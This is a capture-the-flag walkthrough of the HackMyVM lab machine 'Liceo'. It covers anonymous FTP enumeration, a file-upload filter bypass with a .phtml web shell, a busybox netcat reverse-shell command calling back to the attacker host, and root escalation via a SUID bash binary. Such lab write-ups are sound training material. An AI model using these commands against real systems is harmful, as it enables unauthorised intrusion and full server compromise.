# Liceo

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Liceo | iHarzzi | Beginner | HackMyVM |

**Summary:** The exploitation of the Liceo machine began with a comprehensive reconnaissance phase that identified an anonymous FTP service containing a critical note intended for a user named Matias. This discovery directed the attack towards the web application, where automated directory brute forcing uncovered a hidden file upload functionality. Although the application implemented basic security measures by restricting PHP file uploads, this defense was bypassed through the use of the .phtml extension, granting initial access as the service user. The final phase of the attack involved an internal system audit that revealed a major misconfiguration in the form of a setuid bit on the bash binary. This oversight allowed for an immediate and direct escalation to root privileges, enabling the full compromise of the server and the retrieval of both user and administrative flags.

---

## Reconnaissance

The initial engagement started with a network scan to identify the target IP address within the local environment.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.184 08:00:27:61:51:83 VirtualBox
```

Once the host was confirmed at 192.168.100.184, a thorough Nmap scan was executed to enumerate open ports and services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/liceo]
└─$ nmap -sC -sV -p- 192.168.100.184
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 07:38 WIB
Nmap scan report for 192.168.100.184
Host is up (0.0048s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000          191 Feb 01  2024 note.txt
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 68:4c:42:8d:10:2c:61:56:7b:26:c4:78:96:6d:28:15 (ECDSA)
|_  256 7e:1a:29:d8:9b:91:44:bd:66:ff:6a:f3:2b:c7:35:65 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Liceo
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.91 seconds
```

The scan results showed that FTP, SSH, and HTTP were available. Notably, the FTP service allowed anonymous access and contained a file named note.txt.

1. **FTP Access**: The FTP server was accessed using anonymous credentials to retrieve the note.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/liceo]
└─$ ftp 192.168.100.184
Connected to 192.168.100.184.
220 (vsFTPd 3.0.5)
Name (192.168.100.184:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||18725|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        120          4096 Feb 01  2024 .
drwxr-xr-x    2 0        120          4096 Feb 01  2024 ..
-rw-rw-r--    1 1000     1000          191 Feb 01  2024 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||60350|)
150 Opening BINARY mode data connection for note.txt (191 bytes).
100% |*************|   191      185.04 KiB/s    00:00 ETA
226 Transfer complete.
191 bytes received in 00:00 (59.87 KiB/s)
```

2. **Analyzing the Note**: The contents of note.txt provided a crucial hint regarding the web application.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/liceo]
└─$ cat note.txt
Hi Matias, I have left on the web the continuations of today's work,
would you mind contiuing in your turn and make sure that the web will be secure?
Above all, we dont't want intruders...
```

The message suggested that there was pending work on the web server, prompting a deeper investigation of the HTTP service.

3. **Web Directory Enumeration**: A Feroxbuster scan was performed to discover hidden directories and files on the web server.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/liceo]
└─$ feroxbuster -u http://192.168.100.184/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php,txt,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.184/
 🚩  In-Scope Url          │ 192.168.100.184
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      319c http://192.168.100.184/images => http://192.168.100.184/images/
200      GET       12l       38w     3001c http://192.168.100.184/images/f4.png
200      GET        9l       35w     1909c http://192.168.100.184/images/c4.png
200      GET        8l       14w      753c http://192.168.100.184/images/call.png
200      GET      191l      308w     3216c http://192.168.100.184/css/responsive.css
200      GET      621l     1442w    21487c http://192.168.100.184/index.html
200      GET        5l       17w      726c http://192.168.100.184/images/location.png
200      GET       13l       60w     4621c http://192.168.100.184/images/c1.png
200      GET        3l       10w      681c http://192.168.100.184/images/c3.png
200      GET       10l       35w     1896c http://192.168.100.184/images/c6.png
200      GET        4l       12w      414c http://192.168.100.184/images/next-angle.png
200      GET      200l     1784w   176281c http://192.168.100.184/images/about-img.jpg
200      GET      569l     3608w   288111c http://192.168.100.184/images/slider-img.png
301      GET        9l       28w      320c http://192.168.100.184/uploads => http://192.168.100.184/uploads/
301      GET        9l       28w      316c http://192.168.100.184/css => http://192.168.100.184/css/
200      GET       19l       67w     4742c http://192.168.100.184/images/f1.png
200      GET        7l       23w     1461c http://192.168.100.184/images/c5.png
200      GET        9l       37w     3663c http://192.168.100.184/images/f2.png
200      GET       14l       78w     5070c http://192.168.100.184/images/f3.png
301      GET        9l       28w      315c http://192.168.100.184/js => http://192.168.100.184/js/
200      GET      878l     1703w    17458c http://192.168.100.184/css/style.css
200      GET        6l       17w      918c http://192.168.100.184/images/mail.png
200      GET       20l       35w      448c http://192.168.100.184/js/custom.js
200      GET        2l     1276w    88145c http://192.168.100.184/js/jquery-3.4.1.min.js
200      GET        3l       13w      708c http://192.168.100.184/images/quote.png
200      GET       11l       40w     2246c http://192.168.100.184/images/c2.png
200      GET      229l     1429w   169780c http://192.168.100.184/images/freelance-img.jpg
200      GET     1985l     3780w   192348c http://192.168.100.184/css/bootstrap.css
200      GET      621l     1442w    21487c http://192.168.100.184/
200      GET       15l       29w      371c http://192.168.100.184/upload.php
200      GET       18l       78w     1350c http://192.168.100.184/js/
```

The scan identified an upload.php file and an accompanying /uploads/ directory, which are clear indicators of a potential file upload vulnerability.

---

## Initial Access

With the discovery of the upload page, the objective shifted to gaining remote code execution.

1. **Preparing the Web Shell**: A simple PHP web shell was created to execute system commands.

![](image.png)

2. **Bypassing the Extension Filter**: Initial attempts to upload files with the .php extension were blocked by the server's security logic. To circumvent this restriction, the shell was renamed to shell.phtml, which the server accepted and processed as a valid PHP file.

![](image-1.png)

3. **Verifying Remote Code Execution**: The success of the upload was verified by sending a test command to the shell.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/liceo]
└─$ curl -s "http://192.168.100.184/uploads/shell.phtml?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

4. **Establishing a Reverse Shell**: After confirming code execution, a more interactive shell was established. A listener was started on the local machine.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/liceo]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

Then, the target was instructed to connect back using the busybox utility.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/liceo]
└─$ curl -s "http://192.168.100.184/uploads/shell.phtml?cmd=which%20busybox"
/usr/bin/busybox

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/liceo]
└─$ curl -s "http://192.168.100.184/uploads/shell.phtml?cmd=busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash"
```

5. **Upgrading the Shell**: Upon receiving the connection, the shell was upgraded to a fully interactive TTY for better stability and usability.

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 62392
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash-5.1$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/liceo]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

bash-5.1$ export SHELL=/bin/bash
bash-5.1$ export TERM=xterm
bash-5.1$ stty rows 75 cols 115
```

---

## Privilege Escalation

After gaining initial access as the www-data user, the next step was to escalate privileges to root.

1. **System Enumeration**: The system was audited to identify other users and potential misconfigurations.

```bash
bash-5.1$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
dev:x:1000:1000:dev:/home/dev:/bin/bash
bash-5.1$ ls -la /home
total 12
drwxr-xr-x  3 root root     4096 Jan 31  2024 .
drwxr-xr-x 19 root root     4096 Jan 31  2024 ..
drwxr-x---  5 dev  www-data 4096 Feb 11  2024 dev
```

The audit revealed the existence of a user named dev. However, a more significant finding was discovered during a search for SUID binaries.

2. **Exploiting the SUID Bash**: The bash binary was found to have the setuid bit enabled, which is a critical security flaw.

```bash
bash-5.1$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

By executing bash with the -p flag, it was possible to maintain the effective root permissions granted by the setuid bit.

```bash
bash-5.1$ /bin/bash -p
bash-5.1# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

3. **Gaining Full Root Access**: To ensure a stable and complete root environment, a small Python script was used to set the real user and group IDs to 0.

```bash
bash-5.1# python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
root@liceoserver:/var/www/html/images# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

Final confirmation of root access and flag retrieval followed.

```bash
root@liceoserver:/var/www/html/images# su -
root@liceoserver:~# id
uid=0(root) gid=0(root) groups=0(root)
root@liceoserver:~# hostname
liceoserver
root@liceoserver:~# whoami
root
root@liceoserver:~# cat /home/dev/user.txt
71a[REDACTED]
root@liceoserver:~# cat /root/root.txt
BF9[REDACTED]
```

---

## Attack Chain Summary
1. **Reconnaissance**: Conducted network and service enumeration, discovering an anonymous FTP service with a note that provided a pivot point to the web application.
2. **Vulnerability Discovery**: Identified a file upload page and confirmed a bypass for the extension filter by using the .phtml format.
3. **Exploitation**: Uploaded a web shell and executed a reverse shell payload to gain initial access as the www-data user.
4. **Internal Enumeration**: Performed a local system audit and discovered that the bash binary had been misconfigured with a setuid bit.
5. **Privilege Escalation**: Leveraged the SUID bash binary to elevate privileges from the service account to the root user, achieving full system compromise.

